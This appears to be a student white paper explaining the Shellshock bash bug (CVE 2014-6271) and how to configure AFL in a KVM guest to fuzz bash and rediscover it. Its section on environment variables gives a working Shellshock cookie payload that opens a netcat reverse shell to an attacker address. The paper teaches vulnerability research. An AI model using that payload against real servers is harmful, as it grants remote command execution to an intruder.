## Abstract
This paper is designed to provide the reader with an adequate understanding of CVE 2014-6271, the circumstances surrounding this vulnerability that makes it dangerous, and how the reader could discover similar vulnerabilities with American Fuzzy Lop (AFL).  This paper aims to enable its readers to:
1. Identify and understand the role fuzzing plays in finding vulnerabilities.
2. Understand the background experience necessary to properly configure a fuzzer.
3. Configure AFL to fuzz for CVE 2014-6271.
While this paper does not provide any original or cutting edge fuzzing techniques, it does equip the reader with a procedure to setup and configure AFL in such a manner that he/she could expect it to discover software bugs.  This paper does not cover the vulnerability verification process since this subject matter potentially requires extensive experience with low level languages and potentially multi threading which is out of the scope of this white paper.  

Note:  This capstone paper was written as an auxiliary component to my primary project of studying for the Certified Ethical Hacker (C\|EH) certificate exam.  For this reason it does not follow the traditional five chapter model of Ferris State University’s research papers.

## Introduction
Each security update that is applied to a computer has a story.  Some security vulnerabilities were found by the developers who quickly developed a patch.  Other security vulnerabilities were found by white hat hackers who notified the developers who developed a patch.  Some security vulnerabilities were found by gray or black hat hackers who hoarded or leveraged them for their own purposes.  Lastly, by pure happenstance, an anti-virus company or a particularly astute user noticed one of these gray/black hat vulnerabilities in ‘the wild’ and notified the developers who developed a patch.  When reading patch notes and security papers it is oftentimes overly simplistic to look at a vulnerability with 20/20 hindsight and conclude that bug hunting is easy or developer negligence is present.  It is crucial to recognize is that software of any size or age has as large and constantly changing attack surface which further mutates as the end user customizes it to fit their needs.  To identify these software flaws in an efficient manner, guided software fuzzing can be leveraged to better simulate a malicious and/or careless user.  

<br>
## CVE 2014-6271 aka Shellshock or Bash Bug
CVE 2014-6271 is a parsing bug from September 2014 which allows attackers to inject bash commands into a web server.  This bug is a result of how many web applications handle user input by oftentimes indirectly relying on bash’s environmental variables as a middleman to temporarily store information.  This design is ubiquitous to most modern web servers simply due to how numerous programming libraries are designed (lcamtuf, 2014).  The first patch for CVE 2014-6271 attempted to directly patch bash’s parser but it was quickly defeated in less than 24 hours (lcamtuf, 2014).  The second attempt to patch CVE 2014-6271 was developed by Florian Weimer and has since been colloquially called the “Florian patch” (lcamtuf, 2014).  This patch essentially “isolates the function parsing code from attacker-controlled strings” (lcamtuf, 2014) which completely eliminates the possibility of bash’s parser being subject to command injection through environmental variables.  

<br>
## Environmental Variables and Exports in Bash
CVE 2014-6271 is easy to leverage, simply place a valid bash statement in any field which would be exported into an environmental variable by the target web server.  For example, a cookie could be set to <font color="#00ff00">( ) { nc -e /bin/sh 192.168.13.100 80; }</font> and the web server would then connect back to the attacker’s IP address on 192.168.13.100:80 and listen for further instructions.  Bash exports use environmental variables as containers to make variables and functions available to other subprocesses of the shell.  There are many environmental variables which are by default available to all subprocesses such as <font color="#00ff00">echo $HOSTNAME</font>.  These environmental variables provide a quick and simple method for users and developers to access and hand off data between scripts without writing the data to a file or searching for system files.  An alternative to referencing above environmental variable would be <font color="#00ff00">cat /etc/hostname</font>.

<br>
## Common Gateway Interface (CGI) Scripts
CGI scripts are a colloquial programming term for any code which runs on a web server that handles user input/output (Claws, 2010).  These ‘scripts’ are typically written in C, Java, Perl, PHP, and Python and each script performs a specific function on a web server when it serves a request to a client.  For example, one CGI script may handle cookie management.  Another script may take a HTML POST request, update a database, which then updates a web page with user generated content.  A third script may serve different web pages depending on the client browser’s user agent.  CGI scripts simply serve as a customizable translation layer between user input and standardized web server functions which are typically coded and compiled by the web server’s developers.

## StackOverflow
![StackOverflow](/assets/images/afl/stackoverflow.png)
### Figure 1:  An innocent question from December 2009.
The above code snippet <font color="#00ff00">plus1 () { echo $(($1 + 1)); }</font> is quite similar to the CVE 2014-6271 exploit code.  The bash bug could have been a CVE 2009 or earlier bug if someone had simply thought to try placing this syntax in a cookie.  

<br>
## American Fuzzy Lop (AFL)
AFL is a guided software fuzzing tool which intelligently crafts various structured inputs to find bugs and security vulnerabilities.  When a program is compiled with AFL, AFL can monitor which binary instruction paths are taken then change the provided inputs accordingly (lcamtuf, 2014).  If run indefinitely, AFL will cover all available paths through a software binary.  AFL creates new outputs by flipping sequential bits, sequential bytes, or random bits depending on how fruitful the more efficient flips are at covering paths through the binary (lcamtuf, 2014).  This low level fuzzing strategy technically allows AFL to cover all of the possible execution paths without covering all possible inputs.  
AFL can simply start crafting purely random inputs, though this method of operation is extremely inefficient.  To remedy this inefficiency, AFL relies on user supplied seeds to base its analysis off of.  For example, the <font color="00ff00">() { a() { a; }; : >b; }</font> seed can find CVE 2014-6271 within seconds in a properly configured AFL environment.  The syntax for AFL seeds is deceptively simple; ASCII characters are intelligently parsed and a dictionary of syntax characters is created from the seed.  These characters are then added/modified/deleted from the seed in a procedurally random fashion so the seed maintains it’s general structure despite a large number of mutations having been applied to it (lcamtuf, 2014).  

<br>
## Host Configuration
There are no special hardware requirements to running AFL beyond the need for a system capable of compiling C code.  That being said, AFL can run on virtually any number of threads (1 per core) so a multi-core computer will allow you to fuzz much more quickly than a single core computer.  Open Suse Leap 42.2 is used as the host system and an Ubuntu 16.04 LTS server is used as a guest in the KVM virtual machine environment.  Other combinations of operating systems and hypervisors will likely work fine though KVM on Open Suse Leap is used due to its computing efficiency and simple setup.  

1. Install Open Suse Leap 42.2.<br>
The default options will be sufficient for creating a single Ubuntu VM in KVM. Expanding the root partition to at least 100 GB will gives additional overhead for additional VMs and Snapper snapshots.  The VM pool can be moved to the home partition if there is a shortage of space.  To move the VM pool:  <font color="00ff00">sudo virsh pool-edit default</font> and change the path value to something like “/home/root/images” (Note:  VM pools must be created before they can be edited).  Disconnect then reconnect to the pool to apply the changes.
2. [Install temperature monitoring software (optional)](https://extensions.gnome.org/extension/841/freon/).<br>
Temperature reading backend: <font color="00ff00">sudo zypper install monitoring-plugins-sensors</font><br>
Note:  Other temperature monitoring software may need to be installed depending on your hardware.
3. Install KVM
    1. Run Package Updater
    2. Run YaST Control Center
    3. Virtualization > Install Hypervisor and Tools
    4. Check, accept, and wait patiently: ☑ KVM Server ☑ KVM Tools ☑ libvirt LXC daemon.  
    5. Click **“No”** to decline setting up a network bridge.  Virtual networks may not function as expected if you setup a network bridge.
    6. Restart the host machine.
4. Configure KVM
    1. Run Virtual Machine Manager
    2. Create a pool:  File > Add Connection > Connect (default settings)
    3. Create two network connections:  Edit > Connection Details > Virtual Networks.
    4. ![Blue +](/assets/images/afl/kvm_add.png) button > Name the network “NAT” > Steps 2 – 3 leave as default > Step 4 choose NAT.
    5. ![Blue +](/assets/images/afl/kvm_add.png) button > Name the network “Internal” > Steps 2 – 3 leave as default > Step 4 choose NAT.
    6. Enable the networks by clicking ![White ► button](/assets/images/afl/kvm_play.png) button and disable by clicking the ![Red stop sign](/assets/images/afl/kvm_delete.png) button.  **Virtual networks may cause problems with system sleep/hibernation if they are activated.**
    7. Create a storage pool:   Edit > Connection Details > Storage.
    8. ![Blue +](/assets/images/afl/kvm_add.png) button > Name the pool “Images” > Browse > Select the folder where you intend to store your guest disk.
    9. ![Blue +](/assets/images/afl/kvm_add.png) button > Name the pool “Images” > Browse > Select the folder where you intend to make a shared folder.  Your shared folder should be **inside** the folder you selected.
    10. Create additional storage pools as you see necessary.
5. Create and configure a VM
    1. File > New Virtual Machine
    2. Step 1: Default 
    3. Step 2: Select your VM ISO file
    4. Step 3: 2048 to 4096 MiB RAM
    N – 1 CPUs where N is your host machine’s maximum available (tap + to find the maximum)
    5. Step 4: 20 – 32 GiB 
    6. Step 5: ☑ “Customize configuration before install.”  
    7. “Add Hardware” > Select “Filesystem” > Driver: Default > Mode: Mapped > Source path: [Path to shared folder] > Target path: Shared > ☐ “Export filesystem as readonly mount.  
    8. If your guest has a GUI and wish to change your VM’s screen resolution: 
    “Video QXL” > “VMVGA”
6. Take a base snapshot of the VM: ![Snapshot](/assets/images/afl/kvm_snapshot.png) > ![blue + button](/assets/images/afl/kvm_add.png) button > Name the snapshot “Base.”
7. Start the virtual machine by clicking the ![Gray ► button](/assets/images/afl/kvm_play.png) button on the “Virtual Machine Manager” window or on the VM’s window (if the button does not work try the other window).  “Left Control” + “Left Alt” will release the mouse to the host machine.

<br>
## Guest Configuration
All fuzzing will occur on the guest machine.  Fuzzing in a virtual or sandboxed environment is good practice to avoid the unforeseen consequences which sometimes occur when giving software unexpected inputs.  Random disk writes and file corruption may occur.
1. Install the guest VM with default settings and be sure to utilize a network mirror.
2. Change your guest VM’s screen resolution if you are using a guest with a GUI.
3. Mount management
    1. Create mount points:  <font color="#00ff00">sudo mkdir /mnt/Shared && sudo mkdir /mnt/ramdisk</font> 
    2. Mount shared folder: <font color="#00ff00">sudo mount -t 9p -o trans=virtio,version=9p2000.L,rw Shared /mnt/Shared</font>
    3. Unmount shared folder: <font color="#00ff00">sudo umount /mnt/Shared</font><br>
    Note:  System snapshots and hibernations may fail when this folder is mounted!
    4. Mount ramdisk:  <font color="#00ff00">sudo mount -t tmpfs none /mnt/ramdisk -o size=1024m && sudo mkdir /mnt/ramdisk/sync_dir</font><br>
    Note:  AFL makes many small writes to the hard disk which is slow and can be hazardous to SSDs.  A ramdisk solves both of these problems.  
    5. Unmount ramdisk:  <font color="#00ff00">sudo umount /mnt/ramdisk/sync_dir</font><br>
    Note:  Shell scripts are your friend!
4. Update the guest:  <font color="#00ff00">sudo apt-get update && sudo apt-get upgrade</font>
5. Install software:  <font color="#00ff00">sudo apt-get install build-essential make</font>
6. Install bash build dependencies:  <font color="#00ff00">sudo apt-get build-dep bash</font>
7. Get AFL:  <font color="#00ff00">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</font>
8. Get bash source:  <font color="#00ff00">wget https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz</font>
9. Switch to root:  <font color="#00ff00">sudo -i</font>
10. Setup folders: <font color="#00ff00">mkdir -p /src/test/guide</font>
11. Extract AFL:  <font color="#00ff00">tar -xvzf afl-latest.tgz -C /src/</font>
12. Extract bash:  <font color="#00ff00">tar -xvzf bash-4.3.tar.gz -C /src/</font>
13. Move to bash source:  <font color="#00ff00">cd /src/bash-4.3/</font><br>
Patch bash: <font color="#00ff00">patch < /src/afl-*/experimental/bash_shellshock/shellshock-fuzz.diff</font>
14. Compile bash:  <font color="#00ff00">./configure CC=/src/afl-*/afl-gcc CXX=/src/afl-*/afl-g++ --disable-shared && make</font>
15. Copy compiled executable: <font color="#00ff00">cp bash test/</font>
16. Create a  template: <font color="#00ff00">echo -n '() { a() { a; }; : >b; }' > /src/test/guide/script.txt</font>
17. Configure core_pattern:  <font color="#00ff00">echo core > /proc/sys/kernel/core_pattern</font>
18. Start AFL
    1. Master thread:  <font color="#00ff00">/src/afl-*/afl-fuzz -i /src/test/guide -o /mnt/ramdisk -M fuzzer00 /./src/test/bash -c :</font>
    2. Slave thread 1:  <font color="#00ff00">/src/afl-*/afl-fuzz -d -i /src/test/guide -o /mnt/ramdisk -S fuzzer01 /./src/test/bash -c :</font><br>
    Note:  Use “Control” + “Alt” + “F1” through “F6” to switch to different consoles.  In KVM these must be sent through the “Send Key” menu.
    3. Slave thread XY:  <font color="#00ff00">/src/afl-*/afl-fuzz -d -i /src/test/guide -o /mnt/ramdisk -S fuzzerXY /./src/test/bash -c :</font><br>
    Note:  Repeat as many times as needed and remember shell scripts are your friend!  
    4. **Monitor your system temperatures!**
19. Stop AFL
    1. Run AFL for up to two hours (See Figure 2).  Close AFL threads with “Control” + “C.”  Close the “slave” threads before closing the “master” thread otherwise you may lose data.
    2. Copy all files out of the ramdisk:  <font color="#00ff00">cp -a /src/ramdisk /src/</font>
    3. Queue location:  <font color="#00ff00">ls /mnt/ramdisk/afl_out/queue/</font>
    4. Crashes location:  <font color="#00ff00">ls /mnt/ramdisk/afl_out/crashes/</font>
    5. Hangs location:  <font color="#00ff00">ls /mnt/ramdisk/afl_out/hangs/</font>

## Fuzzing for CVE 2014-6271
![Screenshot of AFL after 13 hours](/assets/images/afl/afl_13hrs.png)
### Figure 2:  AFL after over 13 hours of fuzzing.

<br>
## Strategies
Finding CVE 2014-6271 with the fuzzing seed <font color="#00ff00">() { a() { a; }; : >b; }</font> is remarkably quick in this test scenario because we are examining bash 4.3 with 20/20 hindsight.  Of all the seeds we could have used in AFL why choose <font color="#00ff00">() { a() { a; }; : >b; }</font> over any other pseudo random input?  
### Know Your Target
The first task of any prospective bug hunter is to read the available documentation.  A couple pertinent segments of bash’s man pages can be found on the following page in Attachment 1.  The “DEFINITIONS” and “Compound Commands” sections define many of the structural characters of bash which gives the intrepid bug hunter an idea as to which characters could be leveraged to seed a fuzzer.  Special characters, escapes, obscure features, and new features oftentimes conceal bugs since fewer people have used and audited these features.  
### Know Your Developers
Another important aspect of knowing one’s target is the ability to recognize an opportunity to misuse software.  Interpreters and parsers are ample targets for bug hunters due to the complexity involved with programmatically creating an algorithm to separate data from instructions or programmatically limiting the capabilities of a language/application.  Many vulnerabilities, such as CVE 2014-6271, arise from third parties leveraging software for uses beyond it’s original design intentions.  Oftentimes vulnerabilities can be found in software that includes libraries or other dependencies which have unapplied security patches available.  The latter is particularly common in module based web servers and Java applets.  
### Know Your History
As of 2017, CVE 2014-6271 has not yet resurfaced after the initial wave of patches were created in late 2014.  This indicates a successful fix, though not all vulnerabilities are fixed as cleanly as Florian patched bash (lcamtuf, 2014).  Many products have notoriously poor security design where critical security vulnerabilities are patched on a monthly basis.  Feature rich software, especially software which was never designed with comprehensive security measures, will have countless attack vectors and naturally will be more bug prone than modular software with a strictly defined scope.  

<br>
## Bash Terminology
```plaintext
DEFINITIONS
       The following definitions are used throughout the rest  of  this  docu-
       ment.
       blank  A space or tab.
       word   A  sequence  of  characters  considered  as a single unit by the
              shell.  Also known as a token.
       name   A word consisting only of  alphanumeric  characters  and  under-
              scores,  and beginning with an alphabetic character or an under-
              score.  Also referred to as an identifier.
       metacharacter
              A character that, when unquoted, separates words.   One  of  the
              following:
              |  & ; ( ) < > space tab
       control operator
              A token that performs a control function.  It is one of the fol-
              lowing symbols:
              || & && ; ;; ( ) | |& <newline>

Compound Commands
       A  compound command is one of the following.  In most cases a list in a
       command's description may be separated from the rest of the command  by
       one  or  more  newlines, and may be followed by a newline in place of a
       semicolon.

       (list) list is executed in a subshell environment (see  COMMAND  EXECU-
              TION  ENVIRONMENT below).  Variable assignments and builtin com-
              mands that affect the  shell's  environment  do  not  remain  in
              effect  after  the  command completes.  The return status is the
              exit status of list.

       { list; }
              list is simply executed in the current shell environment.   list
              must  be  terminated with a newline or semicolon.  This is known
              as a group command.  The return status is  the  exit  status  of
              list.   Note that unlike the metacharacters ( and ), { and } are
              reserved words and must occur where a reserved word is permitted
              to  be  recognized.   Since they do not cause a word break, they
              must be separated from  list  by  whitespace  or  another  shell
              metacharacter.
```
### Attachment 1

<br>
## Limitations
As stated previously, this small foray into the foundations of bug hunting and vulnerability discovery was a side project to my preparations for the C|EH certificate examination so a limited amount of time was invested into this project.  This project was also conducted without the intention of finding new bugs or security vulnerabilities to avoid any unnecessary and time consuming distractions which would have limited my time to study for C\|EH certificate.  

<br>
## Further Study
This white paper only covers the fundamentals of software fuzzing so there is ample room to expand on this research.  One interesting method of seeding AFL would be to aggregate a database of code snippets from either Github or StackOverflow and to reduce these code snippets into seeds for AFL.  As displayed in Figure 1, countless people have exported bash functions since its inception but only in 2014 did Stéphane Chazelas think to put what is essentially an export statement in a parameter which would be parsed by a web server (Grubb, 2014).  Research on a comprehensive method of identifying exploitable vulnerabilities from unexploitable bugs could also be done with AFL.
